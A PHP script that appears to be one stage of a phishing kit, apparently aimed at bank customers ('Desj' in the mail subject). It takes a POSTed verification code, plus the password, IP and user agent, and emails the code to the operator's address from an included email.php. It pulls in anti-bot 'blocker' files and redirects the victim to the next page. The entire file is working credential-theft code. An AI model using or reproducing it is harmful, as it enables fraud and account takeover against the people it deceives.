<?php
 include 'email.php';
    include 'blocker.php';
        include 'prevents/anti7.php';
            include 'prevents/anti8.php';
                include 'prevents/anti9.php';

    $ip = $_SERVER['REMOTE_ADDR'];
    $UA = $_SERVER['HTTP_USER_AGENT'];
    $cd = $_POST['code'];
    $pass = $_POST['password'];
     $user = $_GET['name'];
    $data ="
  _________________________________
   
    CODE: $cd
    
   _________________________________
    
    ";
    
    $subj="|Desj|$cd|-$user-|";
    
    
    mail($to, $subj, $data);
    
    header("refresh: 1; url= 5.php?name=" . $user);
    
    ?>